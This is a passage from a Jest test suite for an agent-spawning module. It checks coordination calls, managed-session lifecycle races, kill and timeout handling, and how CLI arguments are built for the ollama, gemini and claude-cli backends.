    const spawner = createSpawner();

    // For custom backend: we need the child process to NOT resolve immediately
    // so we can kill it while "running"
    // We'll set up the on handlers to never fire 'close'
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});

    // Start spawn but don't await (it will hang waiting for close)
    const spawnPromise = spawner.spawn({
      backend: 'custom',
      task: 'sleep 9999',
    });

    // Wait a tick for the spawn to register the agent in the map
    await new Promise(r => setTimeout(r, 10));

    // Find the running agent
    const agents = spawner.list();
    expect(agents.length).toBe(1);
    expect(agents[0].status).toBe('running');

    spawner.kill(agents[0].agentId);
    expect(mockChildProcess.kill).toHaveBeenCalledWith('SIGTERM');

    // Now resolve the child process so the spawn promise can complete
    const closeHandler = mockChildProcess.on.mock.calls.find(([event]) => event === 'close');
    if (closeHandler) {
      closeHandler[1](null); // call close handler with null exit code
    }

    const finalResult = await spawnPromise;
    expect(finalResult.status).toBe('killed');
    expect(finalResult.error).toBe('Killed by spawner');
  });
});

// =============================================================================
// PD coordination
// =============================================================================

describe('PD coordination', () => {
  function makeManagedLifecycle(sessionId, overrides = {}) {
    let worktreeBinding = { cwd: null, worktreeId: null, root: null };
    return {
      admit: jest.fn(async (input) => {
        worktreeBinding = { cwd: input.workdir ?? null, worktreeId: null, root: null };
        return {
        success: true,
        sessionId,
        credential: 'actor-managed.secret',
        worktreeBinding,
        };
      }),
      bind: jest.fn(async () => ({ success: true, worktreeBinding, validateBeforeLaunch: async () => ({ success: true }) })),
      complete: jest.fn().mockResolvedValue({ success: true }),
      abort: jest.fn().mockResolvedValue({ success: true }),
      ...overrides,
    };
  }

  test('registers agent with PD on spawn', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('response');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test task',
      identity: 'myapp:api:main',
      purpose: 'Testing coordination',
    });

    const agentCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.endsWith('/agents')
    );
    expect(agentCalls.length).toBe(1);
    const body = JSON.parse(agentCalls[0][1].body);
    expect(body.identity).toBe('myapp:api:main');
    expect(body.purpose).toBe('Testing coordination');
  });

  test('calls /sugar/begin on spawn', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('response');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
      identity: 'myapp:api:main',
    });

    const beginCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('/sugar/begin')
    );
    expect(beginCalls.length).toBe(1);
    const body = JSON.parse(beginCalls[0][1].body);
    expect(body.identity).toBe('myapp:api:main');
    expect(body.lifecycle).toBe('ephemeral');
  });

  test('calls /sugar/done on successful completion', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('Great success');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });

    const doneCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('/sugar/done')
    );
    expect(doneCalls.length).toBe(1);
    const body = JSON.parse(doneCalls[0][1].body);
    expect(body.sessionId).toBe('test-session');
    expect(body.note).toContain('Completed');
    expect(body.note).toContain('Great success');
    expect(body).not.toHaveProperty('skipOriginCheck');
    expect(body).not.toHaveProperty('forceIncomplete');
  });

  test('calls /sugar/done on failure with error message', async () => {
    const spawner = createSpawner();
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('11434')) {
        return {
          ok: false,
          status: 500,
          json: async () => ({}),
          text: async () => 'Model not found',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true, sessionId: 'failed-session' }),
        text: async () => 'OK',
      };
    });

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });

    const doneCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('/sugar/done')
    );
    expect(doneCalls.length).toBe(1);
    const body = JSON.parse(doneCalls[0][1].body);
    expect(body.sessionId).toBe('failed-session');
    expect(body.note).toContain('Failed');
    expect(body.status).toBe('abandoned');
    expect(body).not.toHaveProperty('skipOriginCheck');
    expect(body).not.toHaveProperty('forceIncomplete');
  });

  test('binds and completes a successful managed spawn through the exact in-process session authority', async () => {
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-success');
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-success',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      if (typeof url === 'string' && url.includes('11434')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ message: { content: 'managed output' } }),
          text: async () => 'managed output',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({ managedSessionLifecycle });

    const result = await spawner.spawn({ backend: 'ollama', task: 'managed success' });

    expect(result.status).toBe('completed');
    expect(managedSessionLifecycle.bind).toHaveBeenCalledWith({
      sessionId: 'managed-session-success',
      agentId: result.agentId,
      credential: 'actor-managed.secret',
    }, expect.objectContaining({ signal: expect.any(Object) }));
    expect(managedSessionLifecycle.complete).toHaveBeenCalledWith({
      sessionId: 'managed-session-success',
      agentId: result.agentId,
      credential: 'actor-managed.secret',
      note: 'Completed: managed output',
      status: 'completed',
    }, expect.objectContaining({ signal: expect.any(Object) }));
    expect(result.managedSession).toEqual({ requestedStatus: 'completed', outcome: 'succeeded' });
    expect(mockFetch.mock.calls.some(([url]) => typeof url === 'string' && url.includes('/sugar/done'))).toBe(false);
  });

  test('reports managed completion refusal separately without contradicting the finalized transcript result', async () => {
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-refused', {
      complete: jest.fn().mockResolvedValue({
        success: false,
        code: 'MANAGED_SESSION_PROOF_REQUIRED',
        error: 'exact managed proof missing',
      }),
    });
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-refused',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      if (typeof url === 'string' && url.includes('11434')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ message: { content: 'backend succeeded' } }),
          text: async () => 'backend succeeded',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({ managedSessionLifecycle });

    const result = await spawner.spawn({ backend: 'ollama', task: 'managed refusal' });

    expect(result).toMatchObject({
      status: 'completed',
      error: null,
      managedSession: {
        requestedStatus: 'completed',
        outcome: 'refused',
        code: 'MANAGED_SESSION_PROOF_REQUIRED',
        error: 'exact managed proof missing',
      },
    });
    expect(spawner.list()[0]).toMatchObject({ status: 'completed', managedSession: result.managedSession });
    expect(managedSessionLifecycle.complete).toHaveBeenCalledWith(expect.objectContaining({
      sessionId: 'managed-session-refused',
      credential: 'actor-managed.secret',
      status: 'completed',
    }), expect.objectContaining({ signal: expect.any(Object) }));
    expect(mockFetch.mock.calls.some(([url]) => typeof url === 'string' && url.includes('/sugar/done'))).toBe(false);
  });

  test('managed kill abandons the exact bound session and never invokes public done', async () => {
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-kill');
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-kill',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});
    const spawner = createSpawner({ managedSessionLifecycle });
    const spawnPromise = spawner.spawn({ backend: 'custom', task: 'sleep 9999', workdir: process.cwd() });
    await new Promise(r => setTimeout(r, 10));
    const running = spawner.list().find(agent => agent.status === 'running');
    expect(running).toBeTruthy();

    spawner.kill(running.agentId);
    spawner.kill(running.agentId);
    await new Promise(r => setTimeout(r, 10));
    const closeHandler = mockChildProcess.on.mock.calls.find(([event]) => event === 'close');
    if (closeHandler) closeHandler[1](null);
    const result = await spawnPromise;

    expect(result.status).toBe('killed');
    expect(managedSessionLifecycle.complete).toHaveBeenCalledWith({
      sessionId: 'managed-session-kill',
      agentId: running.agentId,
      credential: 'actor-managed.secret',
      note: 'Killed by spawner',
      status: 'abandoned',
    }, expect.objectContaining({ signal: expect.any(Object) }));
    expect(managedSessionLifecycle.complete).toHaveBeenCalledTimes(1);
    expect(mockFetch.mock.calls.some(([url]) => typeof url === 'string' && url.includes('/sugar/done'))).toBe(false);
  });

  test('kill during deferred admission binds then abandons once without starting the backend', async () => {
    let resolveBegin;
    let admissionSignal;
    const beginBody = new Promise(resolve => { resolveBegin = resolve; });
    const runner = jest.fn().mockResolvedValue({ output: 'must not run', error: null });
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-admission-race', {
      admit: jest.fn((_input, options) => {
        admissionSignal = options.signal;
        return beginBody;
      }),
    });
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => beginBody,
          text: async () => 'OK',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({
      managedSessionLifecycle,
      runnerOverrides: { ollama: runner },
    });
    const pending = spawner.spawn({ backend: 'ollama', task: 'deferred admission' });
    await new Promise(r => setTimeout(r, 0));
    const [admitting] = spawner.list();
    expect(admitting.status).toBe('running');
    spawner.kill(admitting.agentId);
    expect(admissionSignal.aborted).toBe(true);
    resolveBegin({
      success: true,
      sessionId: 'managed-session-admission-race',
      credential: 'actor-managed.secret',
    });

    const result = await pending;

    expect(result.status).toBe('killed');
    expect(runner).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.bind).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.complete).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.abort).not.toHaveBeenCalled();
    expect(result.managedSession).toMatchObject({ requestedStatus: 'abandoned', outcome: 'refused' });
  });

  test('kill during deferred binding waits for the stamp then abandons once without starting the backend', async () => {
    let resolveBind;
    let bindingSignal;
    const binding = new Promise(resolve => { resolveBind = resolve; });
    const runner = jest.fn().mockResolvedValue({ output: 'must not run', error: null });
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-bind-race', {
      bind: jest.fn((_input, options) => {
        bindingSignal = options.signal;
        return binding;
      }),
    });
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-bind-race',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({
      managedSessionLifecycle,
      runnerOverrides: { ollama: runner },
    });
    const pending = spawner.spawn({ backend: 'ollama', task: 'deferred bind' });
    for (let attempt = 0; managedSessionLifecycle.bind.mock.calls.length === 0 && attempt < 20; attempt += 1) {
      await new Promise(r => setTimeout(r, 0));
    }
    const [bindingAgent] = spawner.list();
    spawner.kill(bindingAgent.agentId);
    expect(bindingSignal.aborted).toBe(true);
    resolveBind({ success: true });

    const result = await pending;

    expect(result.status).toBe('killed');
    expect(runner).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.complete).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.abort).toHaveBeenCalledTimes(1);
    expect(managedSessionLifecycle.abort).toHaveBeenCalledWith(expect.objectContaining({
      sessionId: 'managed-session-bind-race',
    }), expect.objectContaining({ signal: expect.any(Object) }));
  });

  test('bind refusal aborts the exact admission and preserves the root refusal', async () => {
    const runner = jest.fn().mockResolvedValue({ output: 'must not run', error: null });
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-bind-refusal', {
      bind: jest.fn().mockResolvedValue({ success: false, error: 'stamp persistence failed' }),
      complete: jest.fn().mockResolvedValue({ success: false, error: 'unbound completion refused' }),
    });
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-bind-refusal',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({
      managedSessionLifecycle,
      runnerOverrides: { ollama: runner },
    });

    const result = await spawner.spawn({ backend: 'ollama', task: 'bind refusal' });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('stamp persistence failed');
    expect(runner).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.complete).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.abort).toHaveBeenCalledTimes(1);
    expect(managedSessionLifecycle.abort).toHaveBeenCalledWith(expect.objectContaining({
      sessionId: 'managed-session-bind-refusal',
      credential: 'actor-managed.secret',
    }), expect.objectContaining({ signal: expect.any(Object) }));
  });

  test('kill racing deferred terminal completion is ignored after the exactly-once transition begins', async () => {
    let resolveCompletion;
    const terminal = new Promise(resolve => { resolveCompletion = resolve; });
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-terminal-race', {
      complete: jest.fn(() => terminal),
    });
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-terminal-race',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({
      managedSessionLifecycle,
      runnerOverrides: {
        ollama: jest.fn().mockResolvedValue({ output: 'terminal race output', error: null }),
      },
    });
    const pending = spawner.spawn({ backend: 'ollama', task: 'terminal race' });
    for (let attempt = 0; managedSessionLifecycle.complete.mock.calls.length === 0 && attempt < 20; attempt += 1) {
      await new Promise(r => setTimeout(r, 0));
    }
    const [settling] = spawner.list();
    spawner.kill(settling.agentId);
    resolveCompletion({ success: true });

    const result = await pending;

    expect(result.status).toBe('completed');
    expect(spawner.list()[0].status).toBe('completed');
    expect(managedSessionLifecycle.complete).toHaveBeenCalledTimes(1);
    expect(managedSessionLifecycle.complete).toHaveBeenCalledWith(
      expect.objectContaining({ status: 'completed' }),
      expect.objectContaining({ signal: expect.any(Object) }),
    );
  });

  test('transcript finalization failure abandons the managed session instead of closing it completed', async () => {
    const transcripts = {
      start: jest.fn(() => 'transcript-finalize-failure'),
      appendMessage: jest.fn(),
      appendOutput: jest.fn(),
      finalize: jest.fn(() => {
        throw new Error('archive unavailable');
      }),
    };
    const managedSessionLifecycle = makeManagedLifecycle('managed-session-transcript-failure');
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/sugar/begin')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            sessionId: 'managed-session-transcript-failure',
            credential: 'actor-managed.secret',
          }),
          text: async () => 'OK',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });
    const spawner = createSpawner({
      transcripts,
      enforceTranscriptPolicy: true,
      managedSessionLifecycle,
      runnerOverrides: {
        ollama: jest.fn().mockResolvedValue({ output: 'backend completed', error: null }),
      },
    });

    const result = await spawner.spawn({ backend: 'ollama', task: 'archive before completion' });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('transcript recording failed (finalize): archive unavailable');
    expect(transcripts.finalize).toHaveBeenCalledTimes(2);
    expect(managedSessionLifecycle.complete).toHaveBeenCalledTimes(1);
    expect(managedSessionLifecycle.complete).toHaveBeenCalledWith(expect.objectContaining({
      sessionId: 'managed-session-transcript-failure',
      status: 'abandoned',
      note: expect.stringContaining('transcript recording failed (finalize)'),
    }), expect.objectContaining({ signal: expect.any(Object) }));
    expect(managedSessionLifecycle.abort).not.toHaveBeenCalled();
  });

  test('never-settling managed admission is deadline-bounded and never starts a backend', async () => {
    const runner = jest.fn().mockResolvedValue({ output: 'must not run', error: null });
    const managedSessionLifecycle = makeManagedLifecycle('unused', {
      admit: jest.fn(() => new Promise(() => {})),
    });
    const spawner = createSpawner({
      managedSessionLifecycle,
      managedLifecycleTimeoutMs: 20,
      runnerOverrides: { ollama: runner },
    });

    const result = await spawner.spawn({ backend: 'ollama', task: 'admission deadline' });

    expect(runner).not.toHaveBeenCalled();
    expect(managedSessionLifecycle.bind).not.toHaveBeenCalled();
    expect(result).toMatchObject({
      status: 'failed',
      managedSession: {
        requestedStatus: 'abandoned',
        outcome: 'timed_out',
        code: 'MANAGED_SESSION_TIMEOUT',
      },
    });
  });

  test.each([
    ['complete', true],
    ['abort', false],
  ])('never-settling managed %s is deadline-bounded with one terminal invocation', async (method, bound) => {
    const managedSessionLifecycle = makeManagedLifecycle(`managed-session-${method}`, {
      ...(bound
        ? { complete: jest.fn(() => new Promise(() => {})) }
        : {
            bind: jest.fn().mockResolvedValue({ success: false, error: 'binding refused' }),
            abort: jest.fn(() => new Promise(() => {})),
          }),
    });
    const spawner = createSpawner({
      managedSessionLifecycle,
      managedLifecycleTimeoutMs: 20,
      runnerOverrides: { ollama: jest.fn().mockResolvedValue({ output: 'backend evidence', error: null }) },
    });

    const result = await spawner.spawn({ backend: 'ollama', task: `${method} deadline` });

    expect(managedSessionLifecycle[method]).toHaveBeenCalledTimes(1);
    expect(result.managedSession).toMatchObject({
      requestedStatus: bound ? 'completed' : 'abandoned',
      outcome: 'timed_out',
      code: 'MANAGED_SESSION_TIMEOUT',
    });
    expect(result.status).toBe(bound ? 'completed' : 'failed');
    expect(mockFetch.mock.calls.some(([url]) => typeof url === 'string' && url.includes('/sugar/done'))).toBe(false);
  });

  test('PD coordination failures do not block spawning', async () => {
    const spawner = createSpawner();

    // All PD calls fail, but ollama succeeds
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('11434')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ message: { content: 'works' } }),
          text: async () => 'works',
        };
      }
      // All PD coordination calls fail
      throw new Error('PD daemon not running');
    });

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'test without PD',
    });

    // Spawn still succeeds despite PD failures
    expect(result.status).toBe('completed');
    expect(result.output).toBe('works');
  });

  test('starts heartbeat interval on spawn', async () => {
    jest.useFakeTimers();

    const spawner = createSpawner();

    // Mock child_process to not resolve (keeps agent "running" so we can
    // observe heartbeats). We use custom backend because ollama/claude
    // awaits are harder to suspend with fake timers + fetch mocks.
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});

    // Start spawn (won't resolve until child process closes)
    const spawnPromise = spawner.spawn({
      backend: 'custom',
      task: 'long running',
    });

    // Advance past the heartbeat interval (30s)
    await jest.advanceTimersByTimeAsync(30000);

    // Check for heartbeat calls
    const heartbeatCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('/heartbeat')
    );
    expect(heartbeatCalls.length).toBeGreaterThanOrEqual(1);

    // Kill to clean up
    const agents = spawner.list();
    if (agents.length > 0) {
      spawner.kill(agents[0].agentId);
    }

    // Resolve child process
    const closeHandler = mockChildProcess.on.mock.calls.find(([e]) => e === 'close');
    if (closeHandler) closeHandler[1](null);
    await spawnPromise.catch(() => {});

    jest.useRealTimers();
  });

  test('clears heartbeat interval on completion', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('done');

    // Spy on clearInterval
    const clearSpy = jest.spyOn(global, 'clearInterval');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });

    // clearInterval should have been called to clean up the heartbeat
    expect(clearSpy).toHaveBeenCalled();
    clearSpy.mockRestore();
  });
});

// =============================================================================
// spawn — identity and purpose
// =============================================================================

describe('spawn — identity and purpose', () => {
  test('passes identity to PD coordination', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
      identity: 'myproject:backend:feature-x',
    });

    const agentCall = mockFetch.mock.calls.find(
      ([url]) => typeof url === 'string' && url.endsWith('/agents')
    );
    const body = JSON.parse(agentCall[1].body);
    expect(body.identity).toBe('myproject:backend:feature-x');
  });

  test('identity is null when not provided', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });

    const agentCall = mockFetch.mock.calls.find(
      ([url]) => typeof url === 'string' && url.endsWith('/agents')
    );
    const body = JSON.parse(agentCall[1].body);
    expect(body.identity).toBeNull();
  });

  test('identity appears in list output', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
      identity: 'myapp:web:dev',
    });

    const agents = spawner.list();
    expect(agents[0].identity).toBe('myapp:web:dev');
  });

  test('purpose appears in list output', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    await spawner.spawn({
      backend: 'ollama',
      task: 'test',
      purpose: 'Fixing critical bug',
    });

    const agents = spawner.list();
    expect(agents[0].purpose).toBe('Fixing critical bug');
  });
});

// =============================================================================
// spawn — each spawner instance is isolated
// =============================================================================

describe('spawner isolation', () => {
  test('separate spawner instances do not share state', async () => {
    const spawner1 = createSpawner();
    const spawner2 = createSpawner();

    setupOllamaFetchMock('ok');

    await spawner1.spawn({ backend: 'ollama', task: 'task 1' });

    expect(spawner1.list().length).toBe(1);
    expect(spawner2.list().length).toBe(0);
  });
});

// =============================================================================
// spawn — claude backend (SDK not installed)
// =============================================================================

describe('spawn — claude backend', () => {
  test('returns error when @anthropic-ai/sdk is not installed', async () => {
    const spawner = createSpawner();

    const result = await spawner.spawn({
      backend: 'claude',
      task: 'test',
    });

    // The dynamic import will fail because the SDK is not installed in tests
    expect(result.status).toBe('failed');
    expect(result.error).toBeTruthy();
  });
});

// =============================================================================
// spawn — gemini backend (REST adapter — no SDK)
// =============================================================================

describe('spawn — gemini backend', () => {
  const originalGeminiKey = process.env.GEMINI_API_KEY;
  afterEach(() => {
    if (originalGeminiKey === undefined) delete process.env.GEMINI_API_KEY;
    else process.env.GEMINI_API_KEY = originalGeminiKey;
  });

  test('drives the REST generateContent endpoint and records exact telemetry', async () => {
    process.env.GEMINI_API_KEY = 'test-gemini-key';
    const costTracker = {
      computeCost: jest.fn(() => ({ costUsd: 0.00155, isEstimate: false })),
      record: jest.fn(() => ({ costUsd: 0.00155, isEstimate: false })),
    };
    const spawner = createSpawner({ enforceTelemetryPolicy: true, costTracker });

    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && (url.includes('/agents') || url.includes('/sugar'))) {
        return { ok: true, status: 200, json: async () => ({ success: true }), text: async () => 'OK' };
      }
      if (typeof url === 'string' && url.includes('generativelanguage.googleapis.com')) {
        return {
          ok: true, status: 200,
          json: async () => ({
            candidates: [{ content: { parts: [{ text: 'PONG' }] }, finishReason: 'STOP' }],
            usageMetadata: { promptTokenCount: 7, candidatesTokenCount: 2, thoughtsTokenCount: 42 },
          }),
          text: async () => 'PONG',
        };
      }
      return { ok: true, status: 200, json: async () => ({ success: true }), text: async () => 'OK' };
    });

    const result = await spawner.spawn({ backend: 'gemini', task: 'ping' });

    expect(result.status).toBe('completed');
    expect(result.output).toBe('PONG');
    // The backend's DEFAULT is the contract, not a particular id: the spawn must
    // land on whatever the registry's cheap rung for gemini resolves to. The
    // literal here was two generations stale.
    expect(result.model).toBe(resolveModel({ backend: 'gemini', capability: 'cheap' }));
    expect(result.telemetry).toMatchObject({ rateMode: 'exact', inputTokens: 7, outputTokens: 44 });
    // thoughtsTokenCount folded into output: 2 + 42 = 44.
    expect(costTracker.record).toHaveBeenCalledWith(
      expect.objectContaining({ backend: 'gemini', inputTokens: 7, outputTokens: 44 })
    );
  });

  test('fails gracefully (not an SDK error) when no API key is present', async () => {
    delete process.env.GEMINI_API_KEY;
    const costTracker = {
      computeCost: jest.fn(() => ({ costUsd: 0, isEstimate: false })),
      record: jest.fn(() => ({ costUsd: 0, isEstimate: false })),
    };
    const spawner = createSpawner({ enforceTelemetryPolicy: true, costTracker });
    const result = await spawner.spawn({ backend: 'gemini', task: 'test' });
    expect(result.status).toBe('failed');
    expect(result.error).toContain('GEMINI_API_KEY');
    expect(result.error).not.toContain('generative-ai');
  });
});

// =============================================================================
// spawn — unique agent IDs
// =============================================================================

describe('spawn — agent IDs', () => {
  test('generates unique agent IDs', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    const r1 = await spawner.spawn({ backend: 'ollama', task: 'a' });
    const r2 = await spawner.spawn({ backend: 'ollama', task: 'b' });

    expect(r1.agentId).not.toBe(r2.agentId);
    expect(r1.agentId).toMatch(/^spawned-[a-f0-9]{12}$/);
    expect(r2.agentId).toMatch(/^spawned-[a-f0-9]{12}$/);
  });
});

// =============================================================================
// spawn — claude-cli backend
// =============================================================================

describe('spawn — claude-cli backend', () => {
  test('spawns claude CLI with -p flag and task', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'Claude output here');

    const result = await spawner.spawn({
      backend: 'claude-cli',
      task: 'Write a hello world program',
    });

    expect(result.status).toBe('completed');
    expect(result.output).toContain('Claude output here');
    expect(result.backend).toBe('claude-cli');
    expect(cpSpawn).toHaveBeenCalledWith(
      expect.stringMatching(/(?:^|[/\\])claude$/),
      ['-p', '--output-format', 'json', 'Write a hello world program'],
      expect.objectContaining({
        detached: true,
        shell: false,
      })
    );
    // No spec.timeout was given, so no hidden wall clock should be applied.
    expect(cpSpawn.mock.calls[0][2]).not.toHaveProperty('timeout');
  });

  test('resumes the exact Claude harness session when adapter ownership matches', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'resumed');
    const sessionId = '11111111-1111-4111-8111-111111111111';

    const result = await spawner.spawn({
      backend: 'claude-cli',
      task: 'Continue this session',
      workdir: TEST_WORKSPACE_IDENTITY.canonicalPath,
      nativeResume: { adapterFamily: 'claude-code', sessionId, workspaceIdentity: TEST_WORKSPACE_IDENTITY },
    });

    expect(cpSpawn.mock.calls[0][1]).toEqual([
      '--resume', sessionId, '-p', '--output-format', 'json', 'Continue this session',
    ]);
    expect(result.harnessSessionId).toBe(sessionId);
  });

  test('passes --allowedTools when specified', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'done');

    await spawner.spawn({
      backend: 'claude-cli',
      task: 'Fix the bug',
      allowedTools: 'Read,Glob,Grep,Bash(git*),Write,Edit',
    });

    const args = cpSpawn.mock.calls[0][1];
    expect(args).toContain('--allowedTools');
    expect(args).toContain('Read,Glob,Grep,Bash(git*),Write,Edit');
  });

  test('passes --model when specified', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'done');

    await spawner.spawn({
      backend: 'claude-cli',
      model: 'haiku',
      task: 'Fix the bug',
    });

    expect(cpSpawn.mock.calls[0][1]).toEqual([
      '-p', '--output-format', 'json', 'Fix the bug',
      '--model', 'haiku',
    ]);
  });

  test('uses cwd spawn option (not --cwd flag) when workdir specified', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'done');

    await spawner.spawn({
      backend: 'claude-cli',
      task: 'Read files',
      workdir: process.cwd(),
    });

    // --cwd is not a valid claude CLI flag; workdir is passed as spawn option
    const args = cpSpawn.mock.calls[0][1];
    expect(args).not.toContain('--cwd');
    expect(cpSpawn.mock.calls[0][2].cwd).toBe(process.cwd());
  });

  test('does not pass --max-tokens (not a valid claude CLI flag)', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'short response');

    await spawner.spawn({
      backend: 'claude-cli',
      task: 'Generate a one-liner',
      maxTokens: 100,
    });

    const args = cpSpawn.mock.calls[0][1];
    expect(args).not.toContain('--max-tokens');
  });

  test('passes valid options together', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'full output');

    await spawner.spawn({
      backend: 'claude-cli',
      task: 'Do everything',
      model: 'sonnet',
      workdir: process.cwd(),
      allowedTools: 'Read,Write',
      maxTokens: 500,
    });

    const args = cpSpawn.mock.calls[0][1];
    expect(args).toEqual([
      '-p', '--output-format', 'json', 'Do everything',
      '--model', 'sonnet',
      '--allowedTools', 'Read,Write',
    ]);
    expect(cpSpawn.mock.calls[0][2].cwd).toBe(process.cwd());
  });

  test('handles non-zero exit code', async () => {
    const spawner = createSpawner();
    resolveChildProcess(1, '', 'claude error output');

    const result = await spawner.spawn({
      backend: 'claude-cli',
      task: 'bad task',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('claude error output');
  });

  test('handles claude not in PATH', async () => {
    const spawner = createSpawner();
    rejectChildProcess('spawn claude ENOENT');

    const result = await spawner.spawn({
      backend: 'claude-cli',
      task: 'test',
    });

    expect(result.status).toBe('failed');
    // The CLI resolver may pass either the bare command or a discovered path.
    expect(result.error).toMatch(/Failed to start (?:.*[/\\])?claude/);
    expect(result.error).toContain('ENOENT');
  });

  test('defaults model to claude-cli', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'ok');

    const result = await spawner.spawn({
      backend: 'claude-cli',
      task: 'test',
    });

    expect(result.model).toBe('claude-cli');
  });

  test('passes custom env variables', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'done');

    await spawner.spawn({
      backend: 'claude-cli',
      task: 'test',
